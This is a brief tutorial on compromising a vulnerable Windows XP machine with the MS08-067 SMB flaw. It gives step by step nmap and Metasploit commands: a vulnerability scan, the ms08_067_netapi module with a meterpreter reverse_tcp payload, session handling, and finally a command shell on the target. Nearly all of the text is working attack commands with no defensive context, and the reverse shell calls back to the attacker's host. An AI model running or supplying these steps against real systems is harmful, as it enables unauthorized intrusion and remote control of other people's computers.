Using msfconsole & nmap, a vulerable Windows XP machine can be exploited using the ms08_067 exploit.

First, run nmap with whatever flags you would and with the --script=smb-check-vulns flag.

Second, if nmap reports the target as using XP and that it's vulnerable, fire up msfconsole and do the following:

msf > use windows/smb/ms08_067_netapi
msf > set payload windows/meterpreter/reverse_tcp

Then, set the options generated from "show options", and the target generated from "show targets".

msf > exploit

If the exploitation succeeds, do the following:

msf > sessions -l

This will list all the sessions connected to your machine.

msf > sessions -i [sessionNum]

This will connect to a chosen session.

msf > shell

This will launch a CMD session on the target, giving access to the system.
